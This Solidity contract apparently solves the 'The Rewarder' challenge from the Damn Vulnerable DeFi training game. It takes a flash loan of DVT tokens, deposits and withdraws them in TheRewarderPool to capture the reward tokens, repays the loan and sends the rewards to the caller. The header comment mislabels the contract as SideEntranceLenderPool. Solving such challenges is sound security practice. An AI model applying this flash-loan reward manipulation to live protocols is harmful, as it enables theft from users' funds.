// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    using Address for address payable;

    FlashLoanerPool private immutable flashLoaner;
    ERC20 private immutable dvt;
    TheRewarderPool private immutable rewarderPool;

    constructor(address _flashLoaner, address _dvt, address _rewarderPool) {
        flashLoaner = FlashLoanerPool(_flashLoaner);
        dvt = ERC20(_dvt);
        rewarderPool = TheRewarderPool(_rewarderPool);
    }

    function attack() external {
        flashLoaner.flashLoan(dvt.balanceOf(address(flashLoaner)));
        uint256 reward = rewarderPool.rewardToken().balanceOf(address(this));
        rewarderPool.rewardToken().transfer(msg.sender, reward);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        dvt.transfer(msg.sender, amount);
    }

    receive() external payable {}
}
